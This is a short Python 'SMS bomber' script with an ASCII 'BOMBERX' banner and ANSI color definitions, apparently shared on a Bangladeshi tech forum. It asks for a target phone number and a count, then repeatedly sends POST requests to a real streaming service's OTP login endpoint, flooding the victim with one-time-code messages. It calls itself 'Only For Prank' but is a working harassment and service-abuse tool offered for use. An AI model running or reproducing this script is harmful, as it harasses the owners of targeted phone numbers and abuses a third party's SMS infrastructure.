# You Can Change The Key's Name. But don't Change The Values.

# Reset
color_off="\033[0m"       # Text Reset

# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

# Bold
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White

# Underline
ublack="\033[4;30m"       # Black
ured="\033[4;31m"         # Red
ugreen="\033[4;32m"       # Green
uyellow="\033[4;33m"      # Yellow
ublue="\033[4;34m"        # Blue
upurple="\033[4;35m"      # Purple
ucyan="\033[4;36m"        # Cyan
uwhite="\033[4;37m"       # White

# Background
on_black="\033[40m"       # Black
on_red="\033[41m"         # Red
on_green="\033[42m"       # Green
on_yellow="\033[43m"      # Yellow
on_blue="\033[44m"        # Blue
on_purple="\033[45m"      # Purple
on_cyan="\033[46m"        # Cyan
on_white="\033[47m"       # White

# High Intensty
iblack="\033[0;90m"       # Black
ired="\033[0;91m"         # Red
igreen="\033[0;92m"       # Green
iyellow="\033[0;93m"      # Yellow
iblue="\033[0;94m"        # Blue
ipurple="\033[0;95m"      # Purple
icyan="\033[0;96m"        # Cyan
iwhite="\033[0;97m"       # White

# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

# High Intensty backgrounds
on_iblack="\033[0;100m"   # Black
on_ired="\033[0;101m"     # Red
on_igreen="\033[0;102m"   # Green
on_iyellow="\033[0;103m"  # Yellow
on_iblue="\033[0;104m"    # Blue
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White


# From TrickBD By ROC-X

print(bipurple+"""
  ▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  ▒██   ██▒
▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒▒▒ █ █ ▒░
▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒░░  █   ░
▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄   ░ █ █ ▒ 
░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒▒██▒ ▒██▒
░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░▒▒ ░ ░▓ ░
▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░░░   ░▒ ░
 ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░  ░    ░  
 ░          ░ ░         ░    ░         ░  ░   ░      ░    ░  
      ░                           ░                          """)
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           

print(bigreen+"Wellcome To My Bomber😍😍")
print("It Is Only For Prank..🥱🥱.")








import requests
from requests.structures import CaseInsensitiveDict
number=str(input(bired+"Enter Your Target  Number:"))
amount=int(input("Enter The Amount: "))
url11 = "https://ss.binge.buzz/otp/send/login"

headers11 = CaseInsensitiveDict()
headers11["Content-Type"] = "application/x-www-form-urlencoded"

data11 = {"phone":number}


for i in range (amount):
	x = requests.post(url11, headers=headers11,data=data11)

	print(i+1, biblue+"binge\t",x.text)